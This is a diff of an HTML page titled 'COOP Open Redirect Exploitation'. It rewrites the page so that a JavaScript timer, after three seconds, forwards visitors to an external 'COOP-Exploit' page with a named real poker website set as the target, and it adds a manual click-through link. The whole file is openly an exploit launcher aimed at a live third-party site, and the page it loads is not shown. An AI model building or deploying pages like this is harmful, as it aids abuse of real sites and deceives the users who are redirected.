@@ -2,27 +2,30 @@
 <html lang="en">
     <head>
         <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
-        <!-- Auto-refresh after 3 seconds to the specified URL -->
-        <meta http-equiv="refresh" content="3; URL=https://sp3ttr0.github.io/COOP-Exploit/?target=https://bravopokerlive.com">
-        
-        <!-- Sets Cross-Origin-Opener-Policy to allow popups while maintaining the same origin -->
+        <!-- Sets COOP policy to allow popups while maintaining the same origin -->
         <meta http-equiv="Cross-Origin-Opener-Policy" content="same-origin-allow-popups">
         
         <title>COOP Open Redirect Exploitation</title>
+
+        <script>
+            // Define the redirection URL
+            var targetURL = "https://bravopokerlive.com";
+            var redirectURL = "https://sp3ttr0.github.io/COOP-Exploit/?target=" + encodeURIComponent(targetURL);
+
+            // Automatically redirect after a delay
+            setTimeout(function () {
+                window.location.href = redirectURL;
+            }, 3000); // 3-second delay
+        </script>
     </head>
     <body>
-        <!-- Main heading of the page -->
         <h1>COOP Open Redirect Exploitation</h1>
-        
-        <!-- Message for users if the auto-redirect does not work -->
         <p>If you are not redirected automatically, <a id="redirectLink" href="#">Click Here</a>.</p>
-        
+
         <script>
-            // Define the redirection URL with the target parameter
-            var redirectURL = "https://sp3ttr0.github.io/COOP-Exploit/?target=" + encodeURIComponent("https://bravopokerlive.com");
-            
-            // Update the link to ensure it redirects correctly when clicked
+            // Update the link so users can click manually if needed
             document.getElementById("redirectLink").href = redirectURL;
         </script>
     </body>
